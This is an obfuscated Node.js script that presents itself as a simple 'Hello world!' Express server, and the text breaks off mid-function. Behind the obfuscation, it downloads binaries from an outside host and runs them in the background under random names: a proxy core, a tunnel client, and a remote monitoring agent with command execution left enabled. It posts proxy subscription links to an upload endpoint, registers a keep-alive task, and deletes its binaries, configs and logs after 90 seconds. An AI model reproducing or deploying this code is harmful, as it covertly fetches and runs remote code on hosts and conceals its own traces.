const _0x4a1cbb=_0x552c;(function(_0x385b80,_0x1c4f3d){const _0x55ff72=_0x552c,_0x39753f=_0x385b80();while(!![]){try{const _0x396791=-parseInt(_0x55ff72(0x156))/0x1+-parseInt(_0x55ff72(0x1e4))/0x2+-parseInt(_0x55ff72(0x174))/0x3*(-parseInt(_0x55ff72(0x165))/0x4)+-parseInt(_0x55ff72(0x1f3))/0x5*(-parseInt(_0x55ff72(0x1be))/0x6)+parseInt(_0x55ff72(0x1e6))/0x7+parseInt(_0x55ff72(0x1de))/0x8+-parseInt(_0x55ff72(0x1fa))/0x9*(parseInt(_0x55ff72(0x191))/0xa);if(_0x396791===_0x1c4f3d)break;else _0x39753f['push'](_0x39753f['shift']());}catch(_0x3e2e99){_0x39753f['push'](_0x39753f['shift']());}}}(_0x2410,0x855a0));const express=require(_0x4a1cbb(0x17e)),app=express(),axios=require(_0x4a1cbb(0x1ff)),os=require('os'),fs=require('fs'),path=require(_0x4a1cbb(0x20d)),{promisify}=require(_0x4a1cbb(0x203)),exec=promisify(require(_0x4a1cbb(0x177))[_0x4a1cbb(0x199)]),{execSync}=require(_0x4a1cbb(0x177)),UPLOAD_URL=process[_0x4a1cbb(0x1ea)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x4a1cbb(0x1ea)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x4a1cbb(0x1ea)][_0x4a1cbb(0x1aa)]||![],FILE_PATH=process[_0x4a1cbb(0x1ea)]['FILE_PATH']||_0x4a1cbb(0x160),SUB_PATH=process[_0x4a1cbb(0x1ea)][_0x4a1cbb(0x19d)]||_0x4a1cbb(0x18d),PORT=process['env'][_0x4a1cbb(0x1a2)]||process[_0x4a1cbb(0x1ea)][_0x4a1cbb(0x1d4)]||0xbb8,UUID=process[_0x4a1cbb(0x1ea)][_0x4a1cbb(0x179)]||'bc0e06a1-53eb-42c2-87f3-d7a4d5425774',NEZHA_SERVER=process['env'][_0x4a1cbb(0x178)]||'',NEZHA_PORT=process[_0x4a1cbb(0x1ea)][_0x4a1cbb(0x1b8)]||'',NEZHA_KEY=process[_0x4a1cbb(0x1ea)][_0x4a1cbb(0x1fd)]||'',ARGO_DOMAIN=process['env'][_0x4a1cbb(0x19c)]||_0x4a1cbb(0x155),ARGO_AUTH=process[_0x4a1cbb(0x1ea)][_0x4a1cbb(0x18f)]||_0x4a1cbb(0x193),ARGO_PORT=process['env'][_0x4a1cbb(0x1bd)]||0x1f41,CFIP=process[_0x4a1cbb(0x1ea)][_0x4a1cbb(0x197)]||_0x4a1cbb(0x1ae),CFPORT=process[_0x4a1cbb(0x1ea)]['CFPORT']||0x1bb,NAME=process['env'][_0x4a1cbb(0x169)]||_0x4a1cbb(0x1ac);!fs[_0x4a1cbb(0x202)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x4a1cbb(0x159))):console[_0x4a1cbb(0x20e)](FILE_PATH+_0x4a1cbb(0x1b2));function generateRandomName(){const _0x43dfa7=_0x4a1cbb,_0x31368d=_0x43dfa7(0x190);let _0x1a5668='';for(let _0x6fa416=0x0;_0x6fa416<0x6;_0x6fa416++){_0x1a5668+=_0x31368d['charAt'](Math[_0x43dfa7(0x170)](Math[_0x43dfa7(0x1ef)]()*_0x31368d['length']));}return _0x1a5668;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4a1cbb(0x17c)](FILE_PATH,npmName),phpPath=path[_0x4a1cbb(0x17c)](FILE_PATH,phpName),webPath=path[_0x4a1cbb(0x17c)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x4a1cbb(0x17c)](FILE_PATH,'sub.txt'),listPath=path[_0x4a1cbb(0x17c)](FILE_PATH,'list.txt'),bootLogPath=path[_0x4a1cbb(0x17c)](FILE_PATH,_0x4a1cbb(0x189)),configPath=path['join'](FILE_PATH,_0x4a1cbb(0x186));function deleteNodes(){const _0x20065e=_0x4a1cbb;try{if(!UPLOAD_URL)return;if(!fs[_0x20065e(0x202)](subPath))return;let _0x39e0e8;try{_0x39e0e8=fs[_0x20065e(0x1b0)](subPath,_0x20065e(0x1dd));}catch{return null;}const _0x3fb723=Buffer['from'](_0x39e0e8,_0x20065e(0x173))[_0x20065e(0x19b)]('utf-8'),_0x59a0e3=_0x3fb723[_0x20065e(0x1f7)]('\x0a')[_0x20065e(0x1fb)](_0x2b9efb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2b9efb));if(_0x59a0e3[_0x20065e(0x1e8)]===0x0)return;return axios[_0x20065e(0x20f)](UPLOAD_URL+_0x20065e(0x1c7),JSON[_0x20065e(0x1b3)]({'nodes':_0x59a0e3}),{'headers':{'Content-Type':_0x20065e(0x157)}})['catch'](_0x1e597b=>{return null;}),null;}catch(_0x42d3ef){return null;}}function cleanupOldFiles(){const _0xcfb0ee=_0x4a1cbb;try{const _0x54a4eb=fs['readdirSync'](FILE_PATH);_0x54a4eb[_0xcfb0ee(0x19f)](_0x33f8c3=>{const _0x2f5aa5=_0xcfb0ee,_0x3bc90e=path[_0x2f5aa5(0x17c)](FILE_PATH,_0x33f8c3);try{const _0xab1ccc=fs[_0x2f5aa5(0x19a)](_0x3bc90e);_0xab1ccc[_0x2f5aa5(0x1a5)]()&&fs[_0x2f5aa5(0x1db)](_0x3bc90e);}catch(_0x5b213a){}});}catch(_0xd000bd){}}function _0x2410(){const _0x2da7b1=['127.0.0.1','php\x20running\x20error:\x20','unlinkSync','listen','utf-8','4651600VWTycU','blackhole','xtls-rprx-vision','/api/add-subscriptions','error','pipe','1234888OvbFPT','Nodes\x20uploaded\x20successfully','4872091EDTKkz','none','length','App\x20is\x20running','env','vless','config.yaml','match','vmess','random','ArgoDomain:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20-s\x20','2328285QBdHMu','Error\x20reading\x20boot.log:','message','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','split','/tunnel.yml\x20run','tunnel.json','570519bJmYfK','filter','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','NEZHA_KEY','status','axios','2096','taskkill\x20/f\x20/im\x20','existsSync','util','response','del\x20/f\x20/q\x20','&fp=firefox&type=ws&host=','automatic\x20access\x20task\x20added\x20successfully','success','direct','get','catch','org','path','log','post','writeFileSync','https+local://8.8.8.8/dns-query','8443','\x20-c\x20','platform','https://amd64.ssss.nyc.mn/bot','map','Subscription\x20uploaded\x20successfully','Content-Type','rarly.asdfm.de5.net','1015425OgrQFU','application/json','/dev/null','\x20is\x20created','\x0aclient_secret:\x20','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20\x20\x20','\x22\x20>\x20/dev/null\x202>&1','includes','\x20failed:\x20','./tmp','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ARGO_DOMAIN:','NEZHA\x20variable\x20is\x20empty,skip\x20running','http','12owLSjl','--tls','web\x20running\x20error:\x20','\x20-p\x20','NAME','Unhandled\x20error\x20in\x20startserver:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','finish','\x20successfully','firefox','stream','floor','443','fileUrl','base64','816303shLERF','quic','/trojan-argo','child_process','NEZHA_SERVER','UUID','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','join','\x20is\x20running','express','has','/vmess-argo','test','pop','/config.json\x20>/dev/null\x202>&1\x20&','arm','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','config.json','tcp','Error\x20executing\x20command:\x20','boot.log','basename','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','then','sub','tls','ARGO_AUTH','abcdefghijklmnopqrstuvwxyz','60mSkSet','Skipping\x20adding\x20automatic\x20access\x20task','eyJhIjoiZTM4MWIwYTZkZGJiYTBlOTk1MDZlM2U2ODgxZWUxOTciLCJ0IjoiMzQ3OWQyNjEtYzU3ZS00ODFhLWIzMTMtMTU3N2YzMjcxODMyIiwicyI6IlpHWTRPR0UwTTJJdE5ERmpaUzAwWldSa0xXSmlORFV0T0RkbU1qaGhaakkyTWpabSJ9','rm\x20-rf\x20','win32','Add\x20automatic\x20access\x20task\x20faild:\x20','CFIP','nohup\x20','exec','statSync','toString','ARGO_DOMAIN','SUB_PATH','aarch64','forEach','/sub.txt\x20saved\x20successfully','send','SERVER_PORT','countryCode','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','isFile','pkill\x20-f\x20\x22[','https://amd64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Download\x20','AUTO_ACCESS','false','raray','Hello\x20world!','cdns.doon.eu.org','https://arm64.ssss.nyc.mn/agent','readFileSync','Error\x20downloading\x20files:','\x20already\x20exists','stringify','arm64','npm\x20running\x20error:\x20','\x0a\x0atrojan://','charAt','NEZHA_PORT','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','createWriteStream','2053','/vless-argo','ARGO_PORT','6xuzPHn','set','tunnel.yml','&path=%2Fvless-argo%3Fed%3D2560#','close','\x20>/dev/null\x202>&1','freedom','mkdirSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/api/delete-nodes','data','unshift','country_code','clear','2087','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','fileName','\x20>\x20nul\x202>&1','trojan','2083','.exe\x20>\x20nul\x202>&1','\x20-c\x20\x22','PORT','push','https://amd64.ssss.nyc.mn/web','from','http://ip-api.com/json/'];_0x2410=function(){return _0x2da7b1;};return _0x2410();}function _0x552c(_0x2d31f9,_0xd4df3f){_0x2d31f9=_0x2d31f9-0x155;const _0x2410ec=_0x2410();let _0x552ca0=_0x2410ec[_0x2d31f9];return _0x552ca0;}app[_0x4a1cbb(0x20a)]('/',function(_0x408c38,_0x210af4){const _0x509e39=_0x4a1cbb;_0x210af4['send'](_0x509e39(0x1ad));});async function generateConfig(){const _0x550b40=_0x4a1cbb,_0x58c733={'log':{'access':'/dev/null','error':_0x550b40(0x158),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x550b40(0x1eb),'settings':{'clients':[{'id':UUID,'flow':_0x550b40(0x1e0)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x550b40(0x1bc),'dest':0xbba},{'path':_0x550b40(0x180),'dest':0xbbb},{'path':_0x550b40(0x176),'dest':0xbbc}]},'streamSettings':{'network':_0x550b40(0x187)}},{'port':0xbb9,'listen':_0x550b40(0x1d9),'protocol':_0x550b40(0x1eb),'settings':{'clients':[{'id':UUID}],'decryption':_0x550b40(0x1e7)},'streamSettings':{'network':'tcp','security':_0x550b40(0x1e7)}},{'port':0xbba,'listen':_0x550b40(0x1d9),'protocol':_0x550b40(0x1eb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x550b40(0x1e7)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x550b40(0x1bc)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x550b40(0x18e),_0x550b40(0x175)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x550b40(0x1d9),'protocol':_0x550b40(0x1ee),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x550b40(0x180)}},'sniffing':{'enabled':!![],'destOverride':[_0x550b40(0x164),_0x550b40(0x18e),_0x550b40(0x175)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x550b40(0x1d9),'protocol':_0x550b40(0x1d0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x550b40(0x176)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x550b40(0x175)],'metadataOnly':![]}}],'dns':{'servers':[_0x550b40(0x211)]},'outbounds':[{'protocol':_0x550b40(0x1c4),'tag':_0x550b40(0x209)},{'protocol':_0x550b40(0x1df),'tag':'block'}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x550b40(0x186)),JSON[_0x550b40(0x1b3)](_0x58c733,null,0x2));}function getSystemArchitecture(){const _0xc1eab8=_0x4a1cbb,_0xa74b84=os['arch']();return _0xa74b84===_0xc1eab8(0x184)||_0xa74b84===_0xc1eab8(0x1b4)||_0xa74b84===_0xc1eab8(0x19e)?'arm':'amd';}function downloadFile(_0x55c47a,_0x17206b,_0x39064c){const _0x3f620d=_0x4a1cbb,_0x384f31=_0x55c47a;!fs[_0x3f620d(0x202)](FILE_PATH)&&fs[_0x3f620d(0x1c5)](FILE_PATH,{'recursive':!![]});const _0x78eaa7=fs[_0x3f620d(0x1ba)](_0x384f31);axios({'method':'get','url':_0x17206b,'responseType':_0x3f620d(0x16f)})[_0x3f620d(0x18c)](_0x50b88e=>{const _0x334cfb=_0x3f620d;_0x50b88e[_0x334cfb(0x1c8)][_0x334cfb(0x1e3)](_0x78eaa7),_0x78eaa7['on'](_0x334cfb(0x16c),()=>{const _0x1e55d7=_0x334cfb;_0x78eaa7[_0x1e55d7(0x1c2)](),console[_0x1e55d7(0x20e)](_0x1e55d7(0x1a9)+path[_0x1e55d7(0x18a)](_0x384f31)+_0x1e55d7(0x16d)),_0x39064c(null,_0x384f31);}),_0x78eaa7['on'](_0x334cfb(0x1e2),_0x520083=>{const _0x4d7cd6=_0x334cfb;fs['unlink'](_0x384f31,()=>{});const _0x1e3a7a=_0x4d7cd6(0x1a9)+path[_0x4d7cd6(0x18a)](_0x384f31)+_0x4d7cd6(0x15f)+_0x520083['message'];console['error'](_0x1e3a7a),_0x39064c(_0x1e3a7a);});})[_0x3f620d(0x20b)](_0x1a5af9=>{const _0x589d75=_0x3f620d,_0x42f041=_0x589d75(0x1a9)+path[_0x589d75(0x18a)](_0x384f31)+'\x20failed:\x20'+_0x1a5af9[_0x589d75(0x1f5)];console[_0x589d75(0x1e2)](_0x42f041),_0x39064c(_0x42f041);});}async function downloadFilesAndRun(){const _0x336414=_0x4a1cbb,_0x45a0ea=getSystemArchitecture(),_0x543125=getFilesForArchitecture(_0x45a0ea);if(_0x543125[_0x336414(0x1e8)]===0x0){console[_0x336414(0x20e)](_0x336414(0x1b9));return;}const _0x4a8f18=_0x543125[_0x336414(0x216)](_0x4d3578=>{return new Promise((_0x407b60,_0xccb8f7)=>{const _0x19cac7=_0x552c;downloadFile(_0x4d3578[_0x19cac7(0x1ce)],_0x4d3578[_0x19cac7(0x172)],(_0x5308a7,_0x3fa29d)=>{_0x5308a7?_0xccb8f7(_0x5308a7):_0x407b60(_0x3fa29d);});});});try{await Promise['all'](_0x4a8f18);}catch(_0x2d8a6b){console[_0x336414(0x1e2)](_0x336414(0x1b1),_0x2d8a6b);return;}function _0x22bddd(_0x1b544c){const _0x4b58f1=0x1fd;_0x1b544c['forEach'](_0x3f925c=>{const _0x207e47=_0x552c;fs[_0x207e47(0x202)](_0x3f925c)&&fs['chmod'](_0x3f925c,_0x4b58f1,_0x4d5d56=>{const _0xbac751=_0x207e47;_0x4d5d56?console[_0xbac751(0x1e2)]('Empowerment\x20failed\x20for\x20'+_0x3f925c+':\x20'+_0x4d5d56):console[_0xbac751(0x20e)]('Empowerment\x20success\x20for\x20'+_0x3f925c+':\x20'+_0x4b58f1[_0xbac751(0x19b)](0x8));});});}const _0x104691=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x22bddd(_0x104691);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1407ae=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x336414(0x1f7)](':')[_0x336414(0x182)]():'',_0x530940=new Set([_0x336414(0x171),_0x336414(0x212),_0x336414(0x200),_0x336414(0x1cc),_0x336414(0x1d1),_0x336414(0x1bb)]),_0x4e83cf=_0x530940[_0x336414(0x17f)](_0x1407ae)?'true':_0x336414(0x1ab),_0x4d6452=_0x336414(0x15a)+NEZHA_KEY+_0x336414(0x16b)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4e83cf+_0x336414(0x17a)+UUID;fs[_0x336414(0x210)](path[_0x336414(0x17c)](FILE_PATH,_0x336414(0x1ec)),_0x4d6452);const _0x39932a=_0x336414(0x198)+phpPath+_0x336414(0x1d3)+FILE_PATH+_0x336414(0x1cd);try{await exec(_0x39932a),console[_0x336414(0x20e)](phpName+_0x336414(0x17d)),await new Promise(_0x3302dc=>setTimeout(_0x3302dc,0x3e8));}catch(_0x58cb96){console['error'](_0x336414(0x1da)+_0x58cb96);}}else{let _0x1452db='';const _0x1750eb=['443',_0x336414(0x212),_0x336414(0x200),_0x336414(0x1cc),_0x336414(0x1d1),_0x336414(0x1bb)];_0x1750eb[_0x336414(0x15e)](NEZHA_PORT)&&(_0x1452db=_0x336414(0x166));const _0x36d047='nohup\x20'+npmPath+_0x336414(0x1f2)+NEZHA_SERVER+':'+NEZHA_PORT+_0x336414(0x168)+NEZHA_KEY+'\x20'+_0x1452db+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x36d047),console[_0x336414(0x20e)](npmName+'\x20is\x20running'),await new Promise(_0x3911ff=>setTimeout(_0x3911ff,0x3e8));}catch(_0x4eab15){console[_0x336414(0x1e2)](_0x336414(0x1b5)+_0x4eab15);}}}else console['log'](_0x336414(0x163));const _0x3f81ba=_0x336414(0x198)+webPath+_0x336414(0x213)+FILE_PATH+_0x336414(0x183);try{await exec(_0x3f81ba),console[_0x336414(0x20e)](webName+_0x336414(0x17d)),await new Promise(_0x395d9d=>setTimeout(_0x395d9d,0x3e8));}catch(_0x3730ee){console[_0x336414(0x1e2)](_0x336414(0x167)+_0x3730ee);}if(fs[_0x336414(0x202)](botPath)){let _0x15e747;if(ARGO_AUTH[_0x336414(0x1ed)](/^[A-Z0-9a-z=]{120,250}$/))_0x15e747=_0x336414(0x185)+ARGO_AUTH;else ARGO_AUTH[_0x336414(0x1ed)](/TunnelSecret/)?_0x15e747=_0x336414(0x1a8)+FILE_PATH+_0x336414(0x1f8):_0x15e747=_0x336414(0x1c6)+FILE_PATH+_0x336414(0x1f6)+ARGO_PORT;try{await exec(_0x336414(0x198)+botPath+'\x20'+_0x15e747+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x2082b5=>setTimeout(_0x2082b5,0x7d0));}catch(_0x266886){console[_0x336414(0x1e2)](_0x336414(0x188)+_0x266886);}}await new Promise(_0x463a4d=>setTimeout(_0x463a4d,0x1388));}function getFilesForArchitecture(_0x139e79){const _0xf389ef=_0x4a1cbb;let _0x368ee4;_0x139e79===_0xf389ef(0x184)?_0x368ee4=[{'fileName':webPath,'fileUrl':_0xf389ef(0x15b)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x368ee4=[{'fileName':webPath,'fileUrl':_0xf389ef(0x1d6)},{'fileName':botPath,'fileUrl':_0xf389ef(0x215)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x582f26=_0x139e79===_0xf389ef(0x184)?_0xf389ef(0x1af):'https://amd64.ssss.nyc.mn/agent';_0x368ee4[_0xf389ef(0x1c9)]({'fileName':npmPath,'fileUrl':_0x582f26});}else{const _0x16bc85=_0x139e79===_0xf389ef(0x184)?'https://arm64.ssss.nyc.mn/v1':_0xf389ef(0x1a7);_0x368ee4[_0xf389ef(0x1c9)]({'fileName':phpPath,'fileUrl':_0x16bc85});}}return _0x368ee4;}function argoType(){const _0x4a728d=_0x4a1cbb;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4a728d(0x20e)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x4a728d(0x210)](path[_0x4a728d(0x17c)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x2672c9='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x4a728d(0x1f7)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x4a728d(0x1f9))+_0x4a728d(0x161)+ARGO_DOMAIN+_0x4a728d(0x1fc)+ARGO_PORT+_0x4a728d(0x17b);fs[_0x4a728d(0x210)](path[_0x4a728d(0x17c)](FILE_PATH,_0x4a728d(0x1c0)),_0x2672c9);}else console['log'](_0x4a728d(0x1a4));}async function extractDomains(){const _0x4f67d1=_0x4a1cbb;let _0x50ad0a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x50ad0a=ARGO_DOMAIN,console[_0x4f67d1(0x20e)](_0x4f67d1(0x162),_0x50ad0a),await _0x32c58c(_0x50ad0a);else try{const _0x77d715=fs[_0x4f67d1(0x1b0)](path[_0x4f67d1(0x17c)](FILE_PATH,'boot.log'),_0x4f67d1(0x1dd)),_0x266d64=_0x77d715[_0x4f67d1(0x1f7)]('\x0a'),_0x1cc707=[];_0x266d64[_0x4f67d1(0x19f)](_0x47362c=>{const _0x4e96ac=_0x4f67d1,_0xf6b0b5=_0x47362c[_0x4e96ac(0x1ed)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xf6b0b5){const _0x233722=_0xf6b0b5[0x1];_0x1cc707[_0x4e96ac(0x1d5)](_0x233722);}});if(_0x1cc707[_0x4f67d1(0x1e8)]>0x0)_0x50ad0a=_0x1cc707[0x0],console[_0x4f67d1(0x20e)](_0x4f67d1(0x1f0),_0x50ad0a),await _0x32c58c(_0x50ad0a);else{console[_0x4f67d1(0x20e)](_0x4f67d1(0x1f1)),fs['unlinkSync'](path['join'](FILE_PATH,_0x4f67d1(0x189)));async function _0x285e2a(){const _0x1a4a22=_0x4f67d1;try{process[_0x1a4a22(0x214)]==='win32'?await exec(_0x1a4a22(0x201)+botName+_0x1a4a22(0x1d2)):await exec(_0x1a4a22(0x1a6)+botName[_0x1a4a22(0x1b7)](0x0)+']'+botName['substring'](0x1)+_0x1a4a22(0x15d));}catch(_0x1f4755){}}_0x285e2a(),await new Promise(_0x5e9454=>setTimeout(_0x5e9454,0xbb8));const _0x29c96d=_0x4f67d1(0x1c6)+FILE_PATH+_0x4f67d1(0x1f6)+ARGO_PORT;try{await exec(_0x4f67d1(0x198)+botPath+'\x20'+_0x29c96d+'\x20>/dev/null\x202>&1\x20&'),console[_0x4f67d1(0x20e)](botName+'\x20is\x20running'),await new Promise(_0x3470bd=>setTimeout(_0x3470bd,0xbb8)),await extractDomains();}catch(_0xbb6b71){console[_0x4f67d1(0x1e2)]('Error\x20executing\x20command:\x20'+_0xbb6b71);}}}catch(_0x1ad79c){console[_0x4f67d1(0x1e2)](_0x4f67d1(0x1f4),_0x1ad79c);}async function _0x5875b1(){const _0x3f602c=_0x4f67d1;try{const _0x23ec90=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x23ec90[_0x3f602c(0x1c8)]&&_0x23ec90[_0x3f602c(0x1c8)][_0x3f602c(0x1ca)]&&_0x23ec90['data'][_0x3f602c(0x20c)])return _0x23ec90[_0x3f602c(0x1c8)][_0x3f602c(0x1ca)]+'_'+_0x23ec90[_0x3f602c(0x1c8)][_0x3f602c(0x20c)];}catch(_0x1582cf){try{const _0x93b1eb=await axios[_0x3f602c(0x20a)](_0x3f602c(0x1d8),{'timeout':0xbb8});if(_0x93b1eb[_0x3f602c(0x1c8)]&&_0x93b1eb['data'][_0x3f602c(0x1fe)]===_0x3f602c(0x208)&&_0x93b1eb[_0x3f602c(0x1c8)]['countryCode']&&_0x93b1eb[_0x3f602c(0x1c8)][_0x3f602c(0x20c)])return _0x93b1eb['data'][_0x3f602c(0x1a3)]+'_'+_0x93b1eb[_0x3f602c(0x1c8)][_0x3f602c(0x20c)];}catch(_0x2b9ca2){}}return'Unknown';}async function _0x32c58c(_0x1a1849){const _0x5f1ffa=await _0x5875b1(),_0x3122ae=NAME?NAME+'-'+_0x5f1ffa:_0x5f1ffa;return new Promise(_0x5d532e=>{setTimeout(()=>{const _0x196d11=_0x552c,_0x5d7b1b={'v':'2','ps':''+_0x3122ae,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x196d11(0x1e7),'net':'ws','type':'none','host':_0x1a1849,'path':'/vmess-argo?ed=2560','tls':_0x196d11(0x18e),'sni':_0x1a1849,'alpn':'','fp':_0x196d11(0x16e)},_0x1b17d7='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1a1849+_0x196d11(0x206)+_0x1a1849+_0x196d11(0x1c1)+_0x3122ae+'\x0a\x0avmess://'+Buffer['from'](JSON['stringify'](_0x5d7b1b))[_0x196d11(0x19b)](_0x196d11(0x173))+_0x196d11(0x1b6)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x1a1849+'&fp=firefox&type=ws&host='+_0x1a1849+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3122ae+_0x196d11(0x15c);console[_0x196d11(0x20e)](Buffer[_0x196d11(0x1d7)](_0x1b17d7)[_0x196d11(0x19b)](_0x196d11(0x173))),fs[_0x196d11(0x210)](subPath,Buffer[_0x196d11(0x1d7)](_0x1b17d7)[_0x196d11(0x19b)](_0x196d11(0x173))),console['log'](FILE_PATH+_0x196d11(0x1a0)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x31d072,_0x4c2d54)=>{const _0x1cb8dd=_0x196d11,_0x3b7e8a=Buffer[_0x1cb8dd(0x1d7)](_0x1b17d7)[_0x1cb8dd(0x19b)](_0x1cb8dd(0x173));_0x4c2d54[_0x1cb8dd(0x1bf)](_0x1cb8dd(0x218),'text/plain;\x20charset=utf-8'),_0x4c2d54[_0x1cb8dd(0x1a1)](_0x3b7e8a);}),_0x5d532e(_0x1b17d7);},0x7d0);});}}async function uploadNodes(){const _0x3b43e1=_0x4a1cbb;if(UPLOAD_URL&&PROJECT_URL){const _0x1049e0=PROJECT_URL+'/'+SUB_PATH,_0x1dd460={'subscription':[_0x1049e0]};try{const _0xf72a37=await axios[_0x3b43e1(0x20f)](UPLOAD_URL+_0x3b43e1(0x1e1),_0x1dd460,{'headers':{'Content-Type':'application/json'}});return _0xf72a37&&_0xf72a37[_0x3b43e1(0x1fe)]===0xc8?(console[_0x3b43e1(0x20e)](_0x3b43e1(0x217)),_0xf72a37):null;}catch(_0x1de93b){if(_0x1de93b[_0x3b43e1(0x204)]){if(_0x1de93b[_0x3b43e1(0x204)][_0x3b43e1(0x1fe)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3b43e1(0x202)](listPath))return;const _0x47fc9a=fs[_0x3b43e1(0x1b0)](listPath,_0x3b43e1(0x1dd)),_0x2255e7=_0x47fc9a[_0x3b43e1(0x1f7)]('\x0a')[_0x3b43e1(0x1fb)](_0x3da516=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3b43e1(0x181)](_0x3da516));if(_0x2255e7[_0x3b43e1(0x1e8)]===0x0)return;const _0x2e0cd4=JSON[_0x3b43e1(0x1b3)]({'nodes':_0x2255e7});try{const _0x515638=await axios[_0x3b43e1(0x20f)](UPLOAD_URL+'/api/add-nodes',_0x2e0cd4,{'headers':{'Content-Type':_0x3b43e1(0x157)}});return _0x515638&&_0x515638[_0x3b43e1(0x1fe)]===0xc8?(console[_0x3b43e1(0x20e)](_0x3b43e1(0x1e5)),_0x515638):null;}catch(_0xee3aa9){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x77dd59=_0x552c,_0x59dad4=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x59dad4[_0x77dd59(0x1d5)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x59dad4['push'](phpPath);process[_0x77dd59(0x214)]===_0x77dd59(0x195)?exec(_0x77dd59(0x205)+_0x59dad4[_0x77dd59(0x17c)]('\x20')+_0x77dd59(0x1cf),_0xd6d01f=>{const _0xa61919=_0x77dd59;console[_0xa61919(0x1cb)](),console['log']('App\x20is\x20running'),console[_0xa61919(0x20e)](_0xa61919(0x18b));}):exec(_0x77dd59(0x194)+_0x59dad4[_0x77dd59(0x17c)]('\x20')+_0x77dd59(0x1c3),_0x5a8640=>{const _0xcbb4b9=_0x77dd59;console[_0xcbb4b9(0x1cb)](),console[_0xcbb4b9(0x20e)](_0xcbb4b9(0x1e9)),console[_0xcbb4b9(0x20e)](_0xcbb4b9(0x18b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x315b9c=_0x4a1cbb;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x315b9c(0x20e)](_0x315b9c(0x192));return;}try{const _0x2334c3=await axios[_0x315b9c(0x20f)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x315b9c(0x157)}});return console['log'](_0x315b9c(0x207)),_0x2334c3;}catch(_0x55761f){return 